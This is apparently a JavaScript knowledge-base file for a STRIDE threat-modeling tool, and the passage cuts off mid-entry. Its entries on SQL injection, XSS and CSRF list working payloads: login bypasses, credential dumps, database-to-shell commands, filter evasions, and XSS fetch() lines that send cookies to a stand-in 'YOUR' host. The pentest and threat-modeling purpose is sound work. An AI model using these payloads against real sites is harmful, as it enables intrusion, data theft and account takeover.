// Web attack knowledge base, mapped to STRIDE.
//
// Each attack maps to one or more STRIDE categories based on how it is weaponized. The same attack
// can appear under several categories because the impact changes with what the attacker does with it
// (for example, SQL injection is Information Disclosure when it reads data and Tampering when it
// writes data). The Possible Attacks modal filters this list by the STRIDE category of the section
// the user opened.
//
// Shape:
//   { id, name, summary, tags[],
//     howTo: [ { heading, body: [paragraphs], examples: [ { code, note } ] } ],
//     stride: { <categoryKey>: { weaponization, why } } }
//
// Category keys: spoofing, tampering, repudiation, information_disclosure, denial_of_service,
// elevation_of_privilege.
//
// Content is written from the testing methodology in HackTricks (pentesting-web) and
// PayloadsAllTheThings, restated in original wording.

export const STRIDE_LABELS = {
  spoofing: 'Spoofing',
  tampering: 'Tampering',
  repudiation: 'Repudiation',
  information_disclosure: 'Information Disclosure',
  denial_of_service: 'Denial of Service',
  elevation_of_privilege: 'Elevation of Privilege',
};

export const attacks = [
  {
    id: 'sql-injection',
    name: 'SQL Injection',
    summary: 'Break out of the intended SQL query by injecting attacker controlled input that the database parses as code.',
    tags: ['injection', 'database'],
    executionContext: {
      where: 'Inside the database engine (the SQL server process), on the database host.',
      detail: 'The injected syntax is parsed and run by the DBMS (MySQL, PostgreSQL, MSSQL, Oracle, SQLite) as part of the query the application already sent. It does not run in the browser, and usually not in the application process either. The flaw lives in how the application builds the query (the data access layer), but the attacker supplied SQL executes with the database account privileges. Where the engine exposes file or command primitives (INTO OUTFILE, xp_cmdshell, COPY TO PROGRAM, user defined functions), that follow on code runs as the database service on the database host, which is often a separate machine from the web server.',
    },
    howTo: [
      {
        heading: 'Root cause and why it matters',
        body: [
          'SQL injection happens when the application builds a query by gluing untrusted input into the SQL string instead of sending the input as a bound parameter. The database cannot tell the difference between the developer intended query and the attacker added syntax, so it parses both as code.',
          'The blast radius is large because the query runs with the database account the application uses, which usually can touch every table the app touches. A single injectable parameter can therefore expose or change the entire dataset, and on several engines it reaches the operating system.',
        ],
      },
      {
        heading: 'Where to look',
        body: [
          'Test every place input can reach a query, not only the obvious ones: URL query parameters, POST form fields, JSON and XML body values, cookies, and request headers such as User-Agent, Referer, X-Forwarded-For, and Authorization. Some apps log or process these into queries.',
          'Numeric id parameters and login forms are the classic first tries. Also target ORDER BY and sort direction, LIMIT and OFFSET, column names in filters, and search fields, because these are frequently concatenated in places a parameterized query cannot easily cover.',
          'Do not forget second order injection: input that is stored safely on one request and then used unsafely in a query on a later request (for example a username set at registration that is later concatenated into an admin report query).',
        ],
      },
      {
        heading: 'Detecting the injection',
        body: [
          'Begin with a syntax breaker and watch for a 500, a database error string, or any change from the baseline response. Then prove it with logic: send one condition that is always true and one that is always false and compare responses. A stable difference confirms your input changes how the query evaluates.',
          'When output never changes and errors are hidden, fall back to blind oracles. A boolean oracle infers one bit at a time from a visible true or false difference; a time oracle infers it from a conditional sleep; an out of band oracle infers it from a DNS or HTTP callback the database makes only when your condition is true.',
          'Test both string and numeric contexts. String context needs a closing quote before your logic and a comment after; numeric context does not need the quote. Try single quote, double quote, and no quote variants.',
        ],
        examples: [
          { code: "id=1'    id=1\"    id=1`", note: 'Syntax breakers: a resulting error or content change hints at the quoting context and engine.' },
          { code: "id=1 AND 1=1    vs    id=1 AND 1=2", note: 'Boolean oracle in numeric context: the two responses should differ.' },
          { code: "id=1' AND '1'='1    vs    id=1' AND '1'='2", note: 'Boolean oracle in single quote string context.' },
          { code: "1 AND SLEEP(5)          -- MySQL/MariaDB", note: 'Time oracle. The response is delayed only if injection works.' },
          { code: "1 AND pg_sleep(5)       -- PostgreSQL", note: 'Postgres time oracle.' },
          { code: "1; WAITFOR DELAY '0:0:5'-- MSSQL", note: 'SQL Server time oracle (needs stacked query support).' },
          { code: "1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5) -- Oracle", note: 'Oracle time oracle.' },
        ],
      },
      {
        heading: 'Fingerprint the database',
        body: [
          'Exploitation syntax differs per engine, so identify it early. Version functions, string concatenation syntax, and comment styles each reveal the engine. Error messages often name it outright.',
        ],
        examples: [
          { code: "MySQL: version(), @@version, /*comment*/, -- (needs trailing space), # ", note: 'Concatenation with CONCAT() or space separated strings.' },
          { code: "PostgreSQL: version(), current_setting('server_version'), || for concat", note: 'Double pipe concatenates strings.' },
          { code: "MSSQL: @@version, + for concat, -- and /* */ comments", note: 'No native LIMIT; uses TOP.' },
          { code: "Oracle: banner FROM v$version, || concat, queries need FROM dual", note: 'SELECT without FROM must use dual.' },
        ],
      },
      {
        heading: 'UNION based extraction',
        body: [
          'When the query result is reflected in the page, UNION SELECT lets you append your own rows. First find the column count with ORDER BY n increasing until it errors, or by UNION SELECT NULL,NULL,... until it succeeds. Then find which columns are printed by placing markers, and make sure each column type is compatible (NULL is compatible with anything).',
          'With visible columns known, read the schema, then dump the interesting tables. Concatenate multiple values into one visible column when only one prints.',
        ],
        examples: [
          { code: "id=1 ORDER BY 5-- -", note: 'Increase the number until it errors to learn the column count.' },
          { code: "id=-1 UNION SELECT NULL,NULL,NULL-- -", note: 'Alternative column count discovery; -1 forces the original row empty so your row shows.' },
          { code: "id=-1 UNION SELECT 1,2,3-- -", note: 'Find which column numbers are rendered on the page.' },
          { code: "id=-1 UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- -", note: 'List tables (MySQL/Postgres/MSSQL).' },
          { code: "id=-1 UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -", note: 'List columns of a table.' },
          { code: "id=-1 UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users-- -", note: 'Dump credentials into a single visible column.' },
          { code: "Oracle: UNION SELECT NULL,table_name,NULL FROM all_tables-- -", note: 'Oracle uses all_tables / all_tab_columns instead of information_schema.' },
        ],
      },
      {
        heading: 'Blind extraction (boolean, time, out of band)',
        body: [
          'When nothing is reflected, extract data character by character. Compare a character to a guess with a boolean or time oracle and binary search the value. This is slow by hand, so understand it once and then automate.',
          'Out of band extraction is faster and works even when in band channels are blocked: coerce the database to make a DNS or HTTP request whose subdomain contains the stolen data. This needs a function that performs network or file access, which varies by engine and privileges.',
        ],
        examples: [
          { code: "1 AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'", note: 'Boolean: true only when the first char is a. Binary search with < and > is faster than equality.' },
          { code: "1 AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>77,SLEEP(3),0)", note: 'Time based binary search of a character code.' },
          { code: "MSSQL OOB: ;exec master..xp_dirtree '\\\\'+(SELECT TOP 1 password FROM users)+'.oob.dns\\a'", note: 'DNS exfiltration via UNC path (needs privileges).' },
        ],
      },
      {
        heading: 'Escalating past data: files, stacked queries, and RCE',
        body: [
          'Some engines let injection read or write files or run commands, which turns a data flaw into server compromise. Availability of these depends on the engine and the database account privileges, so enumerate privileges first.',
          'Stacked queries (multiple statements separated by a semicolon) allow INSERT, UPDATE, DELETE, and procedure calls where the driver permits them. Many MySQL drivers disallow stacking, while MSSQL and Postgres commonly allow it.',
        ],
        examples: [
          { code: "MySQL: SELECT LOAD_FILE('/etc/passwd')   /   ... INTO OUTFILE '/var/www/sh.php'", note: 'File read/write when secure_file_priv and FILE privilege allow it. OUTFILE can plant a web shell.' },
          { code: "MSSQL: EXEC xp_cmdshell 'whoami'", note: 'Direct OS command execution if xp_cmdshell is enabled or can be re-enabled.' },
          { code: "PostgreSQL: COPY (SELECT '') TO PROGRAM 'id'", note: 'Command execution via COPY TO PROGRAM (superuser).' },
          { code: "PostgreSQL large object / lo_import to read files", note: 'Alternate file read path.' },
        ],
      },
      {
        heading: 'Bypassing filters and WAFs',
        body: [
          'When input is filtered, adapt rather than give up. Comments can split keywords, case and whitespace can be varied, and equivalent syntax can replace blocked tokens. If quotes are stripped, some engines accept hex or CHAR() encoded strings so you never type a quote.',
          'When spaces are blocked, use comment separators or alternate whitespace. When keywords like UNION or SELECT are blocked, try inline comments inside the keyword or double writing that survives a naive single pass filter.',
        ],
        examples: [
          { code: "UNION SELECT  ->  UN/**/ION SE/**/LECT", note: 'Inline comments split keywords past simple blocklists.' },
          { code: "spaces blocked: UNION/**/SELECT or UNION%0aSELECT or UNION%a0SELECT", note: 'Comment or alternate whitespace instead of a space.' },
          { code: "quotes blocked: WHERE name=0x61646d696e   or   WHERE name=CHAR(97,100,109,105,110)", note: 'Hex or CHAR() build the string admin without a quote.' },
          { code: "keyword doubling: SELSELECTECT if the filter strips SELECT once", note: 'Survives a naive single pass replace.' },
          { code: "OR 1=1 blocked: OR 2>1, OR 'a'='a', OR 1 LIKE 1", note: 'Equivalent always true conditions.' },
        ],
      },
      {
        heading: 'Authentication bypass',
        body: [
          'Login forms that build the query from the username and password are a direct target. Make the WHERE clause always true, or comment out the password check so only the username matters. When you know a username, comment away the rest so the password is never compared.',
          'When the response only reflects a password hash comparison, you can UNION in your own row that contains a username and the hash of a password you choose, so the app compares against your controlled hash. A more exotic variant abuses functions that return raw bytes (for example an unsalted MD5 taken as raw output), where certain inputs produce bytes that themselves form an always true SQL fragment.',
          'If the application escapes quotes but uses a multibyte charset such as GBK, a crafted lead byte can consume the added backslash and free your quote, restoring the injection. This is the classic multibyte or GBK bypass.',
        ],
        examples: [
          { code: "username=admin'-- -    (password field ignored)", note: 'Comment out the password check and log in as a known user.' },
          { code: "username=' OR 1=1 LIMIT 1-- -", note: 'Always true clause returns the first user, often an admin.' },
          { code: "admin' AND 1=0 UNION SELECT 'admin','5f4dcc3b5aa765d61d8327deb882cf99'-- -", note: 'Inject a row with a password hash you control so the app authenticates you.' },
          { code: "%bf%27 OR 1=1-- -", note: 'GBK multibyte bypass: the lead byte eats the escaping backslash and frees the quote.' },
        ],
      },
      {
        heading: 'Writing data and injecting into INSERT, UPDATE, and ORDER BY',
        body: [
          'Injection is not limited to SELECT. In an INSERT you can add a second row of values, for example creating a second account whose fields carry data pulled from another table, or trigger an ON DUPLICATE KEY UPDATE to overwrite an existing record such as an admin password.',
          'Identifiers cannot be bound by prepared statements, so ORDER BY and column or table name positions built from input stay injectable even when values are parameterized. A sort parameter concatenated into ORDER BY lets you smuggle a subquery or a conditional for a blind oracle.',
          'Watch for filter to SQL converters (search builders, JSON path filters, ORM raw fragments) that fail to escape string values, and for second order injection where a value stored safely on one request is concatenated unsafely into a query on a later request.',
        ],
        examples: [
          { code: "email=x&pass=y&user=z'),('victim','hash',(SELECT token FROM secrets LIMIT 1))-- -", note: 'Second row in an INSERT exfiltrates data or seeds an account.' },
          { code: "sort=name)-- -   and   sort=(CASE WHEN (1=1) THEN name ELSE id END)", note: 'ORDER BY injection stays open even with parameterized values.' },
        ],
      },
      {
        heading: 'Tools and workflow',
        body: [
          'sqlmap automates detection, fingerprinting, extraction, and many evasions. Capture a real authenticated request in Burp, save it to a file, and feed the whole request so cookies and headers are preserved. Start low and increase level and risk only as needed to reduce noise.',
          'Keep the original query in mind: always neutralize the trailing part with the correct comment for the engine, and match the quoting context exactly. When testing manually, work from a stable baseline response so small differences are obvious.',
        ],
        examples: [
          { code: "sqlmap -r request.txt -p id --batch", note: 'Test one parameter using a saved Burp request.' },
          { code: "sqlmap -r request.txt --dbs --level 3 --risk 2", note: 'Enumerate databases with deeper tests.' },
          { code: "sqlmap -r request.txt -D app -T users --dump", note: 'Dump a specific table.' },
          { code: "sqlmap -r request.txt --tamper=space2comment,between --random-agent", note: 'Apply evasion tampers and rotate the User-Agent.' },
          { code: "sqlmap -r request.txt --os-shell", note: 'Attempt an interactive OS shell where the engine and privileges allow it.' },
        ],
      },
    ],
    stride: {
      information_disclosure: {
        weaponization: [
          'UNION SELECT other tables to read credentials, session tokens, API keys, PII, and configuration directly into the response.',
          'Blind extraction (boolean, error, or time oracle) to pull data one value at a time when nothing is reflected.',
          'Out of band exfiltration by forcing the database to make a DNS or HTTP request whose subdomain carries the stolen data.',
          'Read the full schema from information_schema (or all_tables on Oracle) to map every table and column before dumping.',
          'Read local files off the database host with LOAD_FILE (MySQL), pg_read_file (Postgres), or similar, exposing source and secrets.',
          'Reach other databases on the same instance that the app account can see but the feature was never meant to expose.',
        ],
        why: 'The injected query runs with the database privileges of the application, which usually can read every row in every table the app touches, so a single read primitive becomes a window onto the whole datastore and the host filesystem.',
      },
      tampering: {
        weaponization: [
          'UPDATE, INSERT, or DELETE through stacked queries to change prices, flip account flags, alter orders, or wipe tables.',
          'Second row injection in an INSERT to seed attacker chosen records.',
          'ON DUPLICATE KEY UPDATE to overwrite an existing row such as an admin credential.',
          'Write files to disk with INTO OUTFILE or COPY TO to plant a web shell or poison a config file.',
          'ORDER BY or identifier position injection to change how records are processed even when values are parameterized.',
        ],
        why: 'When the application builds a data changing statement from untrusted input, the attacker rewrites what the statement does, so integrity rules that exist only in the application layer are bypassed at the source of truth.',
      },
      elevation_of_privilege: {
        weaponization: [
          'Authentication bypass by making the login WHERE clause always true or commenting out the password check.',
          'UNION inject a row containing a password hash you control so the app authenticates you as an admin.',
          'Set your own role, is_admin, or group via an injectable UPDATE.',
          'OS command execution bridges: xp_cmdshell (MSSQL), COPY TO PROGRAM (Postgres superuser), INTO OUTFILE web shell (MySQL), or user defined functions, giving full server takeover.',
          'Steal another user session token from the database and replay it to inherit their privileges.',
        ],
        why: 'Authorization and authentication decisions that are enforced by a query become attacker controlled once the query is controllable, and the several database to operating system bridges turn a data layer flaw into code execution as the database service.',
      },
      spoofing: {
        weaponization: [
          'Log in as another user without their password by tampering with the login query.',
          'Inject a known hash so the identity check passes for an account you name.',
          'Extract a valid session token or API key and replay it to act as that user.',
        ],
        why: 'If identity is proven by the result of a query, controlling the query lets the attacker forge a positive identity check for any account they choose.',
      },
      denial_of_service: {
        weaponization: [
          'Run destructive statements (DELETE, DROP, TRUNCATE) through a writable injection to remove data the application needs.',
          'Force extremely expensive queries such as cartesian joins or huge RANDOMBLOB or heavy time functions to exhaust CPU and connections.',
          'Lock or fill tables so legitimate requests block or fail.',
        ],
        why: 'Arbitrary control of the query includes destructive and unbounded work, so the attacker can delete what the app depends on or starve the database of resources until it stops serving users.',
      },
    },
  },

  {
    id: 'xss',
    name: 'Cross-Site Scripting (XSS)',
    summary: 'Get the application to return attacker controlled markup or script that runs in another user\'s browser in the site\'s origin.',
    tags: ['injection', 'client-side'],
    executionContext: {
      where: "In the victim's web browser, as JavaScript running in the vulnerable site's origin.",
      detail: "The server only reflects or stores the payload and serves it; the script itself runs on the machine of whoever views the page, inside the same origin as the target site. Because it runs in that origin it inherits the viewer's session and can read and act with their authority. DOM based XSS runs entirely in the browser with no server round trip for the payload at all. The exception is server side XSS: when a backend headless browser or an HTML to PDF renderer processes the markup, the script runs in that server side rendering engine instead of an end user browser, which can turn XSS into local file read or SSRF on the server.",
    },
    howTo: [
      {
        heading: 'Root cause and the three types',
        body: [
          'XSS happens when the application places attacker controlled data into a page without the encoding that the output context requires, so the browser treats the data as markup or script. The fix is context correct output encoding, so the attack is always about finding a spot where that encoding is missing or wrong.',
          'Reflected XSS echoes input from the current request straight into the response, so it needs a crafted link or form. Stored XSS is saved server side and served to other users later (comments, profiles, support tickets, log viewers, admin panels), so it can fire in a session more privileged than yours. DOM based XSS never involves the server response body: client side JavaScript reads a source such as location.hash and writes it to a dangerous sink such as innerHTML.',
        ],
      },
      {
        heading: 'Where to look',
        body: [
          'Test every value that can end up rendered on a page, including ones you cannot see yourself: fields shown to support agents or admins, notification and email templates, file names, and error pages that echo the bad input.',
          'Consider indirect reflections: a value stored in one place and rendered in another, data shown in a PDF or export, and content rendered inside an iframe or a different subdomain where the impact may be higher.',
        ],
      },
      {
        heading: 'Find the reflection and identify the context',
        body: [
          'Inject a unique harmless marker (for example zqxj9) and locate every place it appears in the response. For each reflection, note the exact context, because the breakout differs: HTML text between tags, inside a single or double quoted attribute, inside a script block as a string, inside a URL attribute such as href or src, or inside an HTML comment.',
          'Then send a small set of context probing characters and see which are encoded and which pass through. If the angle brackets survive in HTML text, a tag injection works. If only quotes matter, you are in an attribute or a script string.',
        ],
        examples: [
          { code: "zqxj9<>\"'`", note: 'Probe: see which of these are reflected raw versus encoded to pick the breakout.' },
        ],
      },
      {
        heading: 'Context specific breakouts',
        body: [
          'Once you know the context, use the matching breakout. In HTML text you can inject a tag directly. In an attribute you must close the attribute and often the tag, or add an event handler. In a script string you must close the string and the statement. In a URL context, a javascript: scheme can execute.',
        ],
        examples: [
          { code: "HTML text:  <img src=x onerror=alert(document.domain)>", note: 'img/onerror runs without inline script and survives many filters.' },
          { code: "HTML text:  <svg onload=alert(1)>", note: 'Short and effective; svg fires onload.' },
          { code: "Double quoted attribute:  \"><svg onload=alert(1)>", note: 'Close the attribute and tag, then inject a new element.' },
          { code: "Unquoted attribute:  x onmouseover=alert(1)", note: 'No quote to close; just add a new attribute event handler.' },
          { code: "Inside <script> string:  '-alert(1)-'   or   </script><svg onload=alert(1)>", note: 'Break the JS string, or close the script tag entirely.' },
          { code: "href/src URL context:  javascript:alert(1)", note: 'Executes when the link is followed or the resource loads.' },
        ],
      },
      {
        heading: 'DOM based XSS: sources and sinks',
        body: [
          'DOM XSS lives in the client JavaScript. Trace user controllable sources (location.href, location.hash, location.search, document.referrer, postMessage data, and values read from storage) to dangerous sinks (innerHTML, outerHTML, document.write, insertAdjacentHTML, eval, setTimeout with a string, and framework specific bindings).',
          'Use browser devtools to set breakpoints on the sink, or use the DOM Invader feature in Burp to watch a source flow into a sink automatically. Remember DOM XSS often does not appear in the server response at all, so response grepping will miss it.',
        ],
        examples: [
          { code: "https://target/page#<img src=x onerror=alert(1)>", note: 'If location.hash is written to innerHTML, this fires purely client side.' },
          { code: "postMessage source -> innerHTML sink", note: 'Cross origin messages written to the DOM are a common DOM XSS and can cross trust boundaries.' },
        ],
      },
      {
        heading: 'Prove real impact',
        body: [
          'Move past alert() to something that demonstrates business impact. If the session cookie is not HttpOnly, steal it. Regardless of HttpOnly, you can ride the session: make authenticated requests with the victim credentials, read authenticated responses, capture keystrokes on a login form, or replace the page with a credential phishing form on the trusted origin.',
          'For account takeover, target a state changing endpoint (change email, add an API key, create an admin) using fetch with credentials included, then read the response to confirm.',
        ],
        examples: [
          { code: "<img src=x onerror=\"fetch('https://YOUR/c?'+encodeURIComponent(document.cookie))\">", note: 'Exfiltrate a non HttpOnly cookie.' },
          { code: "<script>fetch('/api/account',{credentials:'include'}).then(r=>r.text()).then(t=>fetch('https://YOUR/x?d='+encodeURIComponent(t)))</script>", note: 'Read an authenticated response and exfiltrate it (works even with HttpOnly).' },
          { code: "<script>fetch('/admin/users',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({user:'me',role:'admin'})})</script>", note: 'Perform a privileged action as the victim.' },
        ],
      },
      {
        heading: 'Filter and CSP bypasses',
        body: [
          'When output is filtered, avoid the blocked tokens: use elements and event handlers the filter missed, mix case, break keywords with allowed characters, or use a polyglot that works in several contexts at once. If <script> is stripped, event handlers on other tags usually still run.',
          'When a Content Security Policy is present, look for weaknesses: unsafe-inline, a nonce you can predict or reuse, an allowlisted CDN that also hosts a callback gadget or an old vulnerable library, a permissive object-src, or a base-uri that lets you hijack relative script loads. Report the CSP as defense in depth, not as a fix for the underlying injection.',
        ],
        examples: [
          { code: "Case/space tricks:  <ScRipt>alert(1)</ScRipt>   <svg/onload=alert(1)>", note: 'Slashes as separators and mixed case defeat naive blocklists.' },
          { code: "No script tag needed:  <details open ontoggle=alert(1)>", note: 'Event handlers on ordinary elements run without <script>.' },
          { code: "CSP with allowed CDN:  <script src=//allowed.cdn/angular.min.js></script> + template gadget", note: 'A trusted CDN hosting a gadget library can bypass script-src allowlists.' },
        ],
      },
      {
        heading: 'Executing under strict filters',
        body: [
          'When the filter blocks parentheses, you can still call functions. Backticks invoke a function as a tagged template, and gadgets such as throw with onerror set to eval run arbitrary code without a single parenthesis. Assigning to toString or valueOf and then coercing an object also triggers a call.',
          'When a specific tag or event name is blocked, brute force the allowed set: browsers accept many event handlers and many separator characters between the event name and the equals sign. Mixed case, embedded null bytes, and alternate whitespace defeat naive blocklists.',
          'DOM clobbering is a script free technique: inject named elements whose id or name shadows a global the page later reads, changing the logic without running your own script. It is useful where script injection is blocked but HTML is allowed.',
        ],
        examples: [
          { code: "alert`1`      onerror=eval;throw'=alert\\x281\\x29'", note: 'Call functions without parentheses using tagged templates or throw plus onerror.' },
          { code: "<svg onload%09=alert(1)>   <sVg/OnLoad=alert(1)>", note: 'Alternate separators and mixed case slip past event handler blocklists.' },
          { code: "eval(atob('YWxlcnQoMSk='))", note: 'Base64 the payload and decode at runtime to dodge keyword filters.' },
          { code: "<a id=x><a id=x name=y href=evil>   then page reads x.y", note: 'DOM clobbering: injected elements shadow a global, altering logic with no script.' },
        ],
      },
      {
        heading: 'Other execution surfaces to check',
        body: [
          'XSS is not only classic HTML pages. Markdown renderers that allow raw HTML or javascript links, SVG and XML documents served inline, client side template injection in frameworks such as AngularJS, and server side HTML to PDF or screenshot renderers all execute script and are frequently missed.',
          'Where you cannot close a tag or quote, dangling markup still leaks data: an unterminated attribute such as an image source can capture everything up to the next quote and send it to your server, stealing tokens even without full script execution.',
        ],
        examples: [
          { code: "Markdown:  [x](javascript:alert(1))   <img src=x onerror=alert(1)>", note: 'Renderers that allow raw HTML or js: links execute.' },
          { code: "AngularJS CSTI:  {{constructor.constructor('alert(1)')()}}", note: 'Client side template injection reaches code execution in the browser.' },
          { code: "Dangling markup:  <img src='https://YOUR/?leak=", note: 'Captures page bytes up to the next quote when you cannot fully break out.' },
        ],
      },
      {
        heading: 'Blind XSS and tooling',
        body: [
          'Blind XSS is stored payload that fires in a context you never see, such as an admin ticket viewer or an internal log dashboard. Seed fields with a payload that calls back to your server with the page URL, cookies, and DOM, then wait for the callback. XSS Hunter style collectors automate this.',
          'For discovery, combine manual context analysis with an automated crawler and a payload set. Keep a per context payload library so you can quickly try the right breakout once you know where input lands.',
        ],
        examples: [
          { code: "<script src=https://YOUR/hunter.js></script>", note: 'Blind XSS beacon: reports back origin, URL, cookies, and DOM when it eventually executes.' },
        ],
      },
    ],
    stride: {
      spoofing: {
        weaponization: [
          'Steal a non HttpOnly session cookie and replay it to log in as the victim.',
          'Ride the existing session with fetch so requests come from the real user context even when the cookie is HttpOnly.',
          'Overlay a fake login form on the trusted origin to harvest credentials, then sign in as the victim.',
          'Key log a login or payment form and exfiltrate what the victim types.',
          'Steal tokens from local or session storage and replay them.',
        ],
        why: 'Script running in the site origin inherits the victim session, so from the server point of view the malicious requests are indistinguishable from the genuine user.',
      },
      information_disclosure: {
        weaponization: [
          'Read the current page DOM and any sensitive data rendered on it.',
          'Fetch authenticated endpoints as the victim and exfiltrate the responses, which works even with HttpOnly cookies.',
          'Read tokens and secrets from local storage, session storage, and cookies that are not HttpOnly.',
          'Read anti CSRF tokens from the page to enable further forged requests.',
          'Scan internal ports and services from the victim browser and report which respond.',
        ],
        why: 'The same origin policy trusts code from the origin, and the injected script is that code, so it can read every response the victim is authorized to receive.',
      },
      tampering: {
        weaponization: 'Rewrite the DOM to change what the victim sees, silently alter form values before submission, issue state changing requests that modify the victim data, or clobber globals to change client logic.',
        why: 'The script has full control of the page and the victim credentials, so it can change both what is displayed and what is sent to the server.',
      },
      elevation_of_privilege: {
        weaponization: [
          'Land stored XSS in a field an administrator console renders, then use their session to create users, grant roles, or change security settings.',
          'Steal the victim CSRF token with XSS to defeat CSRF protection on a privileged action.',
          'Drive admin only functionality directly from the injected script running in the admin session.',
        ],
        why: 'Executing inside a high privilege user session lets the attacker inherit that user authority, turning a low privilege injection point into administrative control.',
      },
    },
  },

  {
    id: 'csrf',
    name: 'Cross-Site Request Forgery (CSRF)',
    summary: 'Trick a logged in victim\'s browser into sending a state changing request the attacker chose, using the victim\'s ambient credentials.',
    tags: ['client-side', 'session'],
    executionContext: {
      where: "In the victim's browser, which sends the forged request; the state change then executes on the application server.",
      detail: "The attacker never touches the target directly. A page under attacker control causes the victim browser to send a request to the application, and the browser automatically attaches the victim ambient credentials such as the session cookie. The application server processes the request as though the victim made it. Crucially the attacker cannot read the response because the same origin policy blocks that, so CSRF is a blind, write only primitive: it drives actions, it does not by itself exfiltrate data.",
    },
    howTo: [
      {
        heading: 'What makes an endpoint forgeable',
        body: [
          'A state changing request is forgeable when the server accepts it based only on automatically sent credentials (the session cookie) and does not require something an attacker page cannot supply: an unpredictable token bound to the session, a custom request header, an Origin or Referer check, or a re-authentication step. If you can replay the request from a different origin and it still works, it is vulnerable.',
          'Also weigh the cookie SameSite attribute. SameSite Strict blocks cross site sends entirely, and Lax blocks most, but Lax still allows top level GET navigations, so a state changing GET stays reachable.',
        ],
      },
      {
        heading: 'Confirm whether the token is actually validated',
        body: [
          'Do not assume a token means protection. Remove the token parameter entirely and resend; if it still works, validation is missing. Send an empty token; if accepted, only presence is checked. Take a valid token from your own account and use it in a different session; if it works, the token is drawn from a global pool and is not tied to the user, so any attacker token is accepted.',
          'If the defense is a custom header such as X-CSRF-Token, remember an HTML form cannot set custom headers, so test whether the request succeeds when the header is omitted. Some apps only validate the header when it is present.',
        ],
        examples: [
          { code: "Tests: 1) delete csrf param  2) csrf=  (empty)  3) reuse your token in a victim session  4) omit X-CSRF-Token header", note: 'Any of these succeeding means the protection is bypassable.' },
        ],
      },
      {
        heading: 'Token and method bypasses',
        body: [
          'When only POST is protected, try the same action as GET, and try method override tricks such as a _method parameter or an X-HTTP-Method-Override header. When protection is a double submit cookie (the token in a cookie must equal the token in the body), you can win if you can set the cookie: a CRLF injection or a subdomain that can write a parent domain cookie lets you plant a token you also put in the body, so the two match.',
          'Predictable or low entropy tokens can be guessed or derived. Tokens scoped to the whole domain rather than the session can be lifted from a less protected subdomain.',
        ],
        examples: [
          { code: "POST->GET:  GET /account/change-email?email=attacker@evil.com", note: 'If the endpoint honors GET, the token requirement may not apply.' },
          { code: "Method override:  add _method=POST or header X-HTTP-Method-Override: POST", note: 'Reach a protected verb through an unprotected one.' },
          { code: "Double submit:  inject Set-Cookie: csrf=KNOWN via CRLF, then submit body csrf=KNOWN", note: 'If you control the cookie, the cookie-equals-body check passes.' },
        ],
      },
      {
        heading: 'Referer, Origin, and SameSite bypasses',
        body: [
          'If the server validates Referer, try suppressing it with a referrer policy so no Referer is sent, and test whether a missing Referer is allowed. If it uses substring matching, host the attack under a lookalike such as target.com.attacker.net or add the allowed string as a query so it appears in the Referer.',
          'Against SameSite Lax, use a top level navigation (a link or a form GET) rather than a background request, and note there is often a short window right after login where Lax is treated leniently. A cookie without an explicit SameSite is treated as Lax by modern browsers, so background cross site POST is usually blocked but top level GET is not.',
        ],
        examples: [
          { code: "Drop Referer:  <meta name='referrer' content='no-referrer'>", note: 'Test whether a missing Referer is accepted.' },
          { code: "Referer substring bypass:  host on target.com.attacker.net or add ?target.com to the URL", note: 'Defeats naive contains() checks.' },
        ],
      },
      {
        heading: 'Content-type tricks for JSON endpoints',
        body: [
          'An endpoint that only accepts application/json and a custom header is hard to forge, but many parsers are lenient. Send the body as a form with enctype text/plain and shape the field name and value so the raw body is valid JSON. Some servers also accept a mislabeled content type. If a simple content type is accepted, no CORS preflight occurs and the forgery works.',
        ],
        examples: [
          { code: "<form method=POST action=https://target/api enctype='text/plain'><input name='{\"email\":\"attacker@evil.com\",\"x\":\"' value='\"}'></form>", note: 'The text/plain body serializes to valid JSON, avoiding a preflight.' },
        ],
      },
      {
        heading: 'Delivery and exploitation',
        body: [
          'For POST, host a page that auto submits a hidden form while the victim is logged in. For GET, a single image or other tag fires the request on load. For a fetch based endpoint, use fetch with credentials included where SameSite allows it.',
          'Login CSRF is the mirror image: force the victim into an account you control (login endpoints often lack CSRF tokens), so their later activity, saved cards, or searches land in your account. Client side CSRF (CSPT2CSRF) arises when a SPA builds an authenticated request path from attacker influenced input such as a URL parameter. Local services on 127.0.0.1 frequently trust any local request and are reachable from a web page.',
        ],
        examples: [
          { code: "<form method=POST action=https://target/email/change id=f><input name=email value=attacker@evil.com></form><script>f.submit()</script>", note: 'Auto submit a POST action.' },
          { code: "<img src='https://target/account/delete?confirm=1'>", note: 'GET based CSRF fires on page load.' },
          { code: "fetch('https://target/account',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'email=attacker@evil.com'})", note: 'Fetch with the victim cookie attached.' },
          { code: "Login CSRF:  auto submit the victim into your account, then wait for them to add data or a card.", note: 'No token on login means you can plant the victim into your session.' },
        ],
      },
      {
        heading: 'Tools',
        body: [
          'Burp Suite can generate a CSRF proof of concept from any captured request. XSRFProbe scans for missing or weak protections. For client side CSRF, extensions that instrument fetch and XHR sinks help spot attacker influenced request paths.',
        ],
      },
    ],
    stride: {
      tampering: {
        weaponization: [
          'Change the victim account data: profile fields, email, address, or preferences.',
          'Perform application actions as the victim: post content, send messages, move funds, place or cancel orders.',
          'Toggle security relevant settings such as notification or recovery options.',
          'Delete or overwrite the victim data through a forced destructive action.',
        ],
        why: 'The forged request carries the victim credentials automatically, so the server processes an integrity changing action the user never intended, and application layer integrity checks that trust the session are satisfied.',
      },
      elevation_of_privilege: {
        weaponization: [
          'Change the victim email or password to a value you control, then reset and seize the account.',
          'Disable multi factor authentication or add an attacker recovery method.',
          'If an administrator visits the trap, force an add user or grant role action to create attacker controlled admin access.',
          'Force a role or permission change on an endpoint that lacks its own authorization check.',
        ],
        why: 'When the forced state change is itself a security control such as credentials, recovery settings, or roles, driving it through the victim session hands the attacker durable elevated access.',
      },
      spoofing: {
        weaponization: [
          'Login CSRF: silently sign the victim into an attacker account so their subsequent activity and saved data are captured under the attacker identity.',
          'Chain a forced credential change into full account takeover, then log in and act as the victim.',
          'Force actions that the server attributes to the victim identity.',
        ],
